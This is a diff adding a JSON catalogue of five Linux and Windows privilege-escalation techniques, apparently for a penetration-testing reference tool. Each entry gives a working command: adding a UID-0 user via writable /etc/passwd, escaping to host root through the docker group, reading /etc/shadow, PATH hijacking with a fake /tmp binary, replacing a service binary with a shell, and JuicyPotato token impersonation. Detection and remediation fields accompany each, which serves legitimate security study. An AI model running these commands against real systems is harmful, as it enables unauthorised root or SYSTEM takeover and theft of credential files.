@@ -1,0 +1,262 @@
+[
+  {
+    "id": "linux-writable-etc-passwd",
+    "tool": "manual",
+    "category": "privilege_escalation",
+    "phase": 6,
+    "os": [
+      "linux"
+    ],
+    "command": "ls -la /etc/passwd && openssl passwd -1 -salt xyz password123",
+    "name": "Writable /etc/passwd",
+    "description": "If /etc/passwd is writable, add a new root user directly.",
+    "arguments": {
+      "ls -la": "Check permissions",
+      "openssl passwd": "Generate password hash"
+    },
+    "expected_output": "# If writable, add:\nhacker:$1$xyz$hash:0:0:root:/root:/bin/bash",
+    "use_case": "Instant root if /etc/passwd is world-writable \u2014 add user with UID 0.",
+    "prerequisites": [
+      "Write access to /etc/passwd"
+    ],
+    "mitre_mapping": [
+      "T1548"
+    ],
+    "mitre_tactic": "Privilege Escalation",
+    "detections": [
+      "Modified /etc/passwd",
+      "New UID 0 user"
+    ],
+    "remediation": [
+      "Correct /etc/passwd permissions (644)",
+      "File integrity monitoring"
+    ],
+    "common_mistakes": [
+      "File not writable",
+      "Not generating valid hash format"
+    ],
+    "alternatives": [
+      "linpeas (checks automatically)"
+    ],
+    "references": [
+      "https://gtfobins.github.io"
+    ],
+    "tags": [
+      "passwd",
+      "writable",
+      "linux",
+      "root",
+      "instant"
+    ]
+  },
+  {
+    "id": "linux-docker-escape",
+    "tool": "docker",
+    "category": "privilege_escalation",
+    "phase": 6,
+    "os": [
+      "linux"
+    ],
+    "command": "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
+    "name": "Docker Group Privilege Escalation",
+    "description": "If user is in docker group, mount host filesystem and chroot to get root.",
+    "arguments": {
+      "-v /:/mnt": "Mount host root to /mnt",
+      "chroot /mnt": "Change root to host filesystem"
+    },
+    "expected_output": "# whoami\nroot (on host!)",
+    "use_case": "Docker group membership = root equivalent. Mount host FS and escape.",
+    "prerequisites": [
+      "User in docker group",
+      "Docker installed"
+    ],
+    "mitre_mapping": [
+      "T1611"
+    ],
+    "mitre_tactic": "Privilege Escalation",
+    "detections": [
+      "Docker container creation",
+      "Host filesystem mount"
+    ],
+    "remediation": [
+      "Remove users from docker group",
+      "Use rootless Docker"
+    ],
+    "common_mistakes": [
+      "Docker not installed",
+      "User not in docker group"
+    ],
+    "alternatives": [
+      "docker run -v /etc/shadow:/shadow alpine cat /shadow"
+    ],
+    "references": [
+      "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/docker-breakout"
+    ],
+    "tags": [
+      "docker",
+      "container",
+      "escape",
+      "group",
+      "root"
+    ]
+  },
+  {
+    "id": "linux-path-hijack",
+    "tool": "manual",
+    "category": "privilege_escalation",
+    "phase": 6,
+    "os": [
+      "linux"
+    ],
+    "command": "echo '/bin/bash' > /tmp/service && chmod +x /tmp/service && export PATH=/tmp:$PATH",
+    "name": "PATH Hijacking",
+    "description": "If a SUID/root program calls a command without full path, hijack it via PATH manipulation.",
+    "arguments": {
+      "echo": "Create fake binary",
+      "export PATH": "Prepend writable directory"
+    },
+    "expected_output": "# When vulnerable SUID binary runs 'service':\n# It executes /tmp/service (our bash) as root",
+    "use_case": "Exploit programs that call commands without absolute paths.",
+    "prerequisites": [
+      "SUID binary calling relative command",
+      "Writable directory in PATH"
+    ],
+    "mitre_mapping": [
+      "T1574.007"
+    ],
+    "mitre_tactic": "Privilege Escalation",
+    "detections": [
+      "Unusual PATH modifications",
+      "Binary execution from /tmp"
+    ],
+    "remediation": [
+      "Use absolute paths in scripts",
+      "Restrict PATH in SUID binaries"
+    ],
+    "common_mistakes": [
+      "Binary uses absolute paths",
+      "Can't modify PATH for SUID"
+    ],
+    "alternatives": [
+      "linpeas",
+      "strings <binary> (find relative calls)"
+    ],
+    "references": [
+      "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation"
+    ],
+    "tags": [
+      "path",
+      "hijack",
+      "suid",
+      "linux",
+      "environment"
+    ]
+  },
+  {
+    "id": "windows-service-abuse",
+    "tool": "sc",
+    "category": "privilege_escalation",
+    "phase": 6,
+    "os": [
+      "windows"
+    ],
+    "command": "sc qc <service_name> && sc config <service_name> binpath= \"C:\\temp\\shell.exe\" && sc start <service_name>",
+    "name": "Windows Service Binary Replacement",
+    "description": "If you can modify a service's binary path, replace it with a payload for SYSTEM execution.",
+    "arguments": {
+      "sc qc": "Query service config",
+      "sc config binpath=": "Change binary path",
+      "sc start": "Start service"
+    },
+    "expected_output": "[SC] ChangeServiceConfig SUCCESS\n[SC] StartService: shell.exe running as SYSTEM",
+    "use_case": "Replace service binary with payload \u2014 runs as SYSTEM when service starts.",
+    "prerequisites": [
+      "Write access to service binary or config",
+      "Service runs as SYSTEM"
+    ],
+    "mitre_mapping": [
+      "T1543.003"
+    ],
+    "mitre_tactic": "Persistence",
+    "detections": [
+      "Service binary modification",
+      "New binary in service path"
+    ],
+    "remediation": [
+      "Restrict service binary permissions",
+      "Monitor service changes"
+    ],
+    "common_mistakes": [
+      "Service running as non-SYSTEM",
+      "Can't restart service"
+    ],
+    "alternatives": [
+      "PowerUp Invoke-ServiceAbuse",
+      "winPEAS"
+    ],
+    "references": [
+      "https://book.hacktricks.wiki/en/windows-hardening/privilege-escalation"
+    ],
+    "tags": [
+      "service",
+      "binary",
+      "windows",
+      "system",
+      "privesc"
+    ]
+  },
+  {
+    "id": "windows-token-impersonation",
+    "tool": "potato",
+    "category": "privilege_escalation",
+    "phase": 6,
+    "os": [
+      "windows"
+    ],
+    "command": "JuicyPotato.exe -l 1337 -p C:\\Windows\\System32\\cmd.exe -t * -c {CLSID}",
+    "name": "Token Impersonation (Potato)",
+    "description": "Exploits SeImpersonatePrivilege to escalate from service account to SYSTEM.",
+    "arguments": {
+      "-l": "Listening port",
+      "-p": "Program to run as SYSTEM",
+      "-t *": "Try all tokens",
+      "-c": "CLSID"
+    },
+    "expected_output": "[+] CreateProcessWithTokenW OK\nC:\\Windows\\system32>whoami\nnt authority\\system",
+    "use_case": "Escalate from service accounts (IIS, SQL) to SYSTEM via token impersonation.",
+    "prerequisites": [
+      "SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege"
+    ],
+    "mitre_mapping": [
+      "T1134.001"
+    ],
+    "mitre_tactic": "Privilege Escalation",
+    "detections": [
+      "Unusual COM object instantiation",
+      "Token manipulation events"
+    ],
+    "remediation": [
+      "Remove SeImpersonatePrivilege where not needed",
+      "Update Windows"
+    ],
+    "common_mistakes": [
+      "Wrong CLSID for OS version",
+      "Privilege not available"
+    ],
+    "alternatives": [
+      "PrintSpoofer",
+      "GodPotato",
+      "SweetPotato"
+    ],
+    "references": [
+      "https://book.hacktricks.wiki/en/windows-hardening/privilege-escalation"
+    ],
+    "tags": [
+      "potato",
+      "token",
+      "impersonation",
+      "seimpersonate",
+      "system"
+    ]
+  }
+]
